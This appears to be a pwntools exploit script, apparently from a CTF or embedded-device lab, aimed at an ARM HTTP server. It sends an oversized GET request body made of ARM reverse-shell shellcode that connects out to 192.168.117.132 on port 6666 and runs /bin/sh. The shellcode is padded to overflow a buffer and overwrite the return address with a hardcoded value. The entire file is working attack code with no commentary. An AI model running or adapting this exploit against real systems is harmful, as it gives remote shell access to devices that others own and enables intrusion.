from pwn import *
context(arch='arm',log_level='debug')

conn = remote('127.0.0.1',80)

def str2byte(s):
    return str.encode(s)

def request(socketfd,boby,path='/'):
    request = b'GET ' + str2byte(path) + b' HTTP/1.1\r\nContent-Length: ' + str2byte(str(len(boby))) + b'\r\n\r\n' + boby
    #request =  boby
    socketfd.sendline(request)

#payload = cyclic(0x1060)
sc = [

	0x01, 0x10, 0x8F, 0xE2,
	0x11, 0xFF, 0x2F, 0xE1,

	0x02, 0x20, 0x01, 0x21,
	0x92, 0x1a, 0x0f, 0x02,
	0x19, 0x37, 0x01, 0xdf,
	0x06, 0x1c, 0x08, 0xa1,
	0x10, 0x22, 0x02, 0x37,
	0x01, 0xdf, 0x3f, 0x27,
	0x02, 0x21,

	0x30, 0x1c, 0x01, 0xdf,
	0x01, 0x39, 0xfb, 0xd5,
	0x05, 0xa0, 0x92, 0x1a,
	0x05, 0xb4, 0x69, 0x46,
	0x0b, 0x27,0x01, 0xdf,
	0xc0, 0x46,
	#/* struct sockaddr */
	0x02, 0x00,
	#/* port: 6666 */
	0x1a, 0x0a,
	#/* ip: 192.168.117.132 */
	0xc0, 0xa8, 0x75, 0x84,
	#/* "/bin/sh\0" */
	0x2f, 0x62, 0x69, 0x6e,0x2f, 0x73, 0x68, 0x00
]
shellcode = bytes(sc)
payload = shellcode.ljust(0xfec,b'a')  +p32(0x000221C0)
boby= payload

request(conn,boby)

conn.interactive()
